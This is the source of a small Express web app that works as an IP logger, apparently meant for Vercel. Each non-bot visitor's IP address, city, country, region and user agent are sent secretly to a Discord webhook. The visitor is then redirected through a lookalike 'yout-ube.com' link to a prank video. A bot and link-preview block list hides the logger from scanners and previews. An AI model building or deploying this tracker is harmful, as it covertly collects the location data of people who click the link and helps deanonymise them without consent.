// Libs
const express = require("express");
const userAgent = require("express-useragent");
const path = require("path");
const { WebhookClient } = require("discord.js");

// Setup and middleware
const webhookClient = new WebhookClient({ url: process.env.URL });
const app = express();

app.disable("x-powered-by")
app.use(userAgent.express());
app.use(express.static(path.join(__dirname, "./public",)))


// Decline requests from automated scripts
const isBot = (browser) => {
    const bots = [
        "python-requests", "curl", "unknown", "axios", "Vercelbot",
        "HeadlessChrome", "HeadlessFirefox", "puppeteer", "selenium", "phantomjs",
        "httpclient", "urllib", "mechanize", "wget", "go-http-client",
        "Java", "libwww-perl", "Googlebot", "Bingbot", "Yahoo! Slurp",
        "Baiduspider", "YandexBot", "DuckDuckBot", "MJ12bot",
        "facebookexternalhit", "Facebot", "vercel-screenshot"
    ];
    
    return bots.some(bot => browser.toLowerCase().includes(bot.toLowerCase()));
};


// Main page
app.get("/", (req, res) => {
    if (!isBot(req.useragent.browser)){
        let payload = {
            title: req.headers["x-forwarded-for"],
            color: 439191,
            fields: [
                {
                    name: "Country",
                    value: (req.headers["x-vercel-ip-country"]) ? decodeURI(req.headers["x-vercel-ip-country"]) : "Unknown"
                },
                {
                    name: "City",
                    value: (req.headers["x-vercel-ip-city"]) ? decodeURI(req.headers["x-vercel-ip-city"]) : "Unknown"
                },
                {
                    name: "Region",
                    value: (req.headers["x-vercel-ip-country-region"]) ? decodeURI(req.headers["x-vercel-ip-city"]) : "Unknown"
                },
                {
                    name: "User Agent",
                    value: (req.useragent.source) ? decodeURI(req.useragent.source) : "Unknown"
                }
            ]
        };
        webhookClient.send({ embeds: [payload] }).then((response) => {
            res.redirect("https://www.yout-ube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley");
        }).catch((err) => {
            res.redirect("https://www.yout-ube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley");
        });
    } else{
        res.redirect("/no-access");
    };
});


// No access page
app.get("/no-access",(req,res) => {
    res.sendFile(path.join(__dirname, "./public", "no_access.html")); // I could just send a status code, but this is more fun
});

// For vercel serverless
module.exports = app